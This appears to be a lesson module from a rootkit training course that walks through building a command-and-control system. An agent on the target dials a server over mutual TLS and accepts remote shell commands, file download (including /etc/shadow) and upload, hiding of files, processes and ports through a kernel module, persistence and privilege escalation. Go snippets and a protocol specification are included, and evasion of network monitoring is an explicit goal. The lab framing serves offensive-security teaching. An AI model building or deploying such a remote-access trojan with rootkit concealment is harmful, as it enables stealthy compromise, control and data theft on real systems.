# M02: Remote Control

L15 through L19 built the pieces: mTLS transport, mkdir bridge, command dispatch,
shell execution, file transfer.
Now assemble them into a complete C2 system.
The operator types commands in a TUI on the host.
The server relays them over mTLS to the agent in the VM.
The agent executes them (directly, or via mkdir for kernel commands).
tcpdump on the wire sees nothing but HTTPS to a normal-looking server.

## Architecture

```text
  Operator (host)                 Network               Agent (VM)
  +-------------------+                               +------------------+
  |  TUI              |                               |  mTLS client     |
  |  reeflective/     |         mTLS :443             |                  |
  |  console          +------------------------------->  dispatch loop   |
  |                   |    TLS 1.3, mutual auth       |                  |
  |  lipgloss         <-------------------------------+  handlers:       |
  |  styled output    |    plaintext over TLS         |    PING          |
  +-------------------+                               |    STATUS        |
  |  Webapp :8080     |                               |    SHELL <cmd>   |
  |  (browser UI)     |                               |    DOWNLOAD <f>  |
  +-------------------+                               |    UPLOAD <f>    |
                                                      |    HIDE <t> <v>  |
                                                      |    PERSIST       |
                                                      |    ESCALATE      |
                                                      +------------------+
                                                             |
                                                             v
                                                      +------------------+
                                                      |  rklings.ko      |
                                                      |  (via mkdir)     |
                                                      +------------------+
```

## Protocol

Plaintext lines over mTLS.
Newline-delimited.
No framing, no encoding.
TLS handles integrity and confidentiality.

```text
  server -> agent: PING\n
  agent -> server: PONG\n

  server -> agent: SHELL id\n
  agent -> server: OK\nuid=0(root) gid=0(root)\n.\n

  server -> agent: DOWNLOAD /etc/passwd\n
  agent -> server: 1523\n<1523 raw bytes>

  server -> agent: HIDE FILE secret.txt\n
  agent -> server: OK\n
  (agent runs: mkdir /tmp/rklings.h.f.secret.txt)
```

Shell output ends with a line containing only a dot (`.`).
File transfers send a decimal byte count, then that many raw bytes.

## Command set

| Command | Agent action |
|---------|-------------|
| PING | Reply PONG |
| STATUS | Report agent state (uptime, PID, uid) |
| SHELL <cmd> | exec.Command("sh", "-c", cmd), return output |
| DOWNLOAD <path> | Send file size + raw bytes |
| UPLOAD <path> | Receive file size + raw bytes, write to path |
| HIDE FILE <name> | mkdir rklings.h.f.<name> |
| HIDE PID <pid> | mkdir rklings.h.i.<pid> |
| HIDE PORT <port> | mkdir rklings.h.p.<port> |
| HIDE CONTENT <str> | mkdir rklings.h.c.<str> |
| PERSIST | mkdir rklings.persist |
| ESCALATE | mkdir rklings.e |
| ESCALATE <pid> | mkdir rklings.e.<pid> |

## Operator TUI

The server uses reeflective/console for the interactive operator shell.
lipgloss styles the output: green for success, red for errors, dim for metadata.

TUI commands map to protocol commands:

```text
  operator> ping
  PONG (12ms)

  operator> shell whoami
  root

  operator> hide file secret.txt
  OK

  operator> download /etc/shadow
  Saved: /tmp/shadow (1.2 KB)
```

## Webapp

A minimal HTTP server on 127.0.0.1:8080 provides:
- Agent status (connected/disconnected, last seen)
- Command input form
- Output display
- File browser for downloads

## You write

Two binaries:

**cmd/agent/main.go** (~150 lines):
- mTLS dial with embedded certs
- Command dispatch loop (bufio.Scanner)
- Handlers: PING, STATUS, SHELL, DOWNLOAD, UPLOAD, HIDE, PERSIST, ESCALATE
- mkdir bridge for kernel commands

**cmd/server/main.go** (~80 lines):
- mTLS listener (server cert + client CA verification)
- Accept agent connection, store reference
- Start TUI and webapp goroutines

**cmd/server/tui.go** (~120 lines):
- reeflective/console setup with command registration
- Each TUI command sends protocol line to agent, reads response
- lipgloss styling for output

**cmd/server/web.go** (~80 lines):
- net/http on 127.0.0.1:8080
- Status endpoint, command endpoint, simple HTML UI

## API

```go
// Agent: mTLS dial
cert, _ := tls.X509KeyPair(agentCert, agentKey)
pool := x509.NewCertPool()
pool.AppendCertsFromPEM(caCert)
conn, _ := tls.Dial("tcp", serverAddr, &tls.Config{
    Certificates: []tls.Certificate{cert},
    RootCAs:      pool,
    MinVersion:   tls.VersionTLS13,
})

// Server: mTLS listen
serverCert, _ := tls.LoadX509KeyPair(certFile, keyFile)
clientPool := x509.NewCertPool()
clientPool.AppendCertsFromPEM(caCertPEM)
ln, _ := tls.Listen("tcp", ":443", &tls.Config{
    Certificates: []tls.Certificate{serverCert},
    ClientCAs:    clientPool,
    ClientAuth:   tls.RequireAndVerifyClientCert,
    MinVersion:   tls.VersionTLS13,
})

// TUI: reeflective/console
app := console.New("rklings")
app.AddCommand("shell", "Execute command on agent", shellHandler)
app.AddCommand("hide", "Hide target via kernel module", hideHandler)
app.Start()

// Webapp
http.HandleFunc("/api/status", statusHandler)
http.HandleFunc("/api/command", commandHandler)
http.ListenAndServe("127.0.0.1:8080", nil)

// mkdir bridge (agent side)
os.Mkdir("/tmp/rklings.h.f."+name, 0755)
```

## Test it

Terminal 1 (host, server):
```
$ rklings run m02
rklings> ping
PONG (8ms)
rklings> shell uname -r
7.0.0-38-generic
rklings> hide file secret.txt
OK
rklings> download /etc/hostname
Saved: /tmp/hostname (12 bytes)
```

Terminal 2 (verify traffic):
```
$ tcpdump -i lo port 443 -c 10
... TLS 1.3 ... Application Data ...
(no plaintext visible)
```

Browser:
```
http://127.0.0.1:8080
(agent status: connected, command input, output display)
```

## Validate

```
$ rklings validate m02
  [+] server starts on :443 with mTLS
  [+] agent connects with valid client cert
  [+] TLS 1.3 negotiated
  [+] PING/PONG round-trip
  [+] SHELL executes and returns output
  [+] DOWNLOAD transfers file correctly
  [+] HIDE FILE triggers mkdir in VM
  [+] tcpdump shows only encrypted traffic
  [+] webapp responds on :8080
  PASS
```

## Next

Everything works remotely.
But the agent binary is on disk, the .ko was loaded from a file, and the
process shows in ps.
L20 through L24 add the tradecraft to disappear completely.
